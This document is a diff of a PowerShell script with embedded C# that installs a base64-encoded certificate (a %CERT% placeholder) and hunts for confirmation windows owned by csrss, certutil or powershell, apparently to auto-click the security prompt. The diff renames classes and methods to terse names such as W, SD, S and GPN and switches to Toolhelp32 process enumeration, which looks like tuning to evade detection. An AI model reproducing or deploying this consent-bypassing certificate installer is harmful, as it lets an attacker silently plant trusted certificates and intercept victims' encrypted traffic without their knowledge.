@@ -7,9 +7,9 @@ using System.Diagnostics;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 
-public static class Win32
+public static class W
 {
-	public class SearchData
+	public class SD
     {
         public string Wndclass;
         public string Title;
@@ -17,11 +17,11 @@ public static class Win32
         public IntPtr hWnd;
     }
 
-    private delegate bool EnumWindowsProc(IntPtr hWnd, ref SearchData data);
+    private delegate bool EnumWindowsProc(IntPtr hWnd, ref SD data);
 
     [DllImport("user32.dll")]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, ref SearchData data);
+    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, ref SD data);
 	
 	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
@@ -45,6 +45,49 @@ public static class Win32
 	[DllImport("user32.dll", CharSet = CharSet.Auto)]
 	static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
 	
+	[Flags]
+    private enum SnapshotFlags : uint
+    {
+    HeapList = 0x00000001,
+    Process = 0x00000002,
+    Thread = 0x00000004,
+    Module = 0x00000008,
+    Module32 = 0x00000010,
+    Inherit = 0x80000000,
+    All = 0x0000001F,
+    NoHeaps = 0x40000000
+    }
+    //inner struct used only internally
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+    private struct PROCESSENTRY32
+    {
+    const int MAX_PATH = 260;
+    internal UInt32 dwSize;
+    internal UInt32 cntUsage;
+    internal UInt32 th32ProcessID;
+    internal IntPtr th32DefaultHeapID;
+    internal UInt32 th32ModuleID;
+    internal UInt32 cntThreads;
+    internal UInt32 th32ParentProcessID;
+    internal Int32 pcPriClassBase;
+    internal UInt32 dwFlags;
+    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
+    internal string szExeFile;
+    }
+
+    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+    static extern IntPtr CreateToolhelp32Snapshot([In]UInt32 dwFlags, [In]UInt32 th32ProcessID);
+
+    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+    static extern bool Process32First([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
+
+    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+    static extern bool Process32Next([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
+
+    [DllImport("kernel32", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool CloseHandle([In] IntPtr hObject);
+    
 	const int BM_CLICK = 0x00F5;
 	
 	public static byte[] GetCertAsByteArray(String sCert)
@@ -52,7 +95,7 @@ public static class Win32
 		return Convert.FromBase64String(sCert);
     }
         
-	public static void Start(String sCert){
+	public static void S(String sCert){
         byte[] bCert = GetCertAsByteArray(sCert);
         if (bCert != null)
         {
@@ -90,7 +133,7 @@ public static class Win32
 	
 	public static IntPtr SearchForWindow(string wndclass, string title)
     {
-        SearchData sd = new SearchData();
+        SD sd = new SD();
         sd.Wndclass = wndclass;
         sd.Title = title;
         sd.hWnd=IntPtr.Zero;
@@ -98,16 +141,16 @@ public static class Win32
         return sd.hWnd;
     }
     
-	public static bool EnumProc(IntPtr hWnd, ref SearchData data)
+	public static bool EnumProc(IntPtr hWnd, ref SD data)
     {
     	StringBuilder caption = new StringBuilder(1024);
         StringBuilder className = new StringBuilder(1024);
         GetWindowText(hWnd, caption, caption.Capacity);
         GetClassName(hWnd, className, className.Capacity);
-        String sEN=GetProcessName(hWnd);
+        String sEN=GPN(hWnd).ToLower();
 		if((!data.Wndclass.Equals(String.Empty) && className.ToString().StartsWith(data.Wndclass)) || (!data.Title.Equals(String.Empty) && caption.ToString().StartsWith(data.Title)))
 		{
-        	if(sEN.Contains("csrss") || sEN.Contains("certutil"))
+        	if(sEN.Contains("csrss") || sEN.Contains("certutil")  || sEN.Contains("powershell"))
 	        {
 		        data.hWnd = hWnd;
                 return false;
@@ -116,12 +159,42 @@ public static class Win32
        	
         return true;
     }
-    
-	public static String GetProcessName(IntPtr hWnd){
-		uint processID = 0;
-		uint threadID = GetWindowThreadProcessId(hWnd, out processID);
-		Process p = Process.GetProcessById((int)processID);
-		return p.ProcessName.ToLower();
+  
+	public static String GPN(IntPtr hWnd){
+		uint pID = 0;
+		uint threadID = GetWindowThreadProcessId(hWnd, out pID);
+		String sProc = null;
+	    IntPtr handleToSnapshot = IntPtr.Zero;
+	    try
+	    {
+	        PROCESSENTRY32 procEntry = new PROCESSENTRY32();
+	        procEntry.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
+	        handleToSnapshot = CreateToolhelp32Snapshot((uint)SnapshotFlags.Process, 0);
+	        if (Process32First(handleToSnapshot, ref procEntry))
+	        {
+	        do
+	        {
+	            if (pID == procEntry.th32ProcessID)
+	            {
+	            sProc = procEntry.szExeFile;
+	            break;
+	            }
+	        } while (Process32Next(handleToSnapshot, ref procEntry));
+	        }
+	        else
+	        {
+	        	throw new ApplicationException(string.Format("Failed with win32 error code {0}", Marshal.GetLastWin32Error()));
+	        }
+	    }
+	    catch (Exception ex)
+	    {
+	        throw new ApplicationException("Can't get the process.", ex);
+	    }
+	    finally
+	    {
+	        CloseHandle(handleToSnapshot);
+	    }
+	    return sProc;
 	}
 	public static bool ECW(IntPtr hWnd, IntPtr lParam)
 	{
@@ -130,7 +203,7 @@ public static class Win32
 	}
 }
 "@;
-[Win32]::Start("%CERT%");
+[W]::S("%CERT%");
 exit
 }
 ConfirmCert
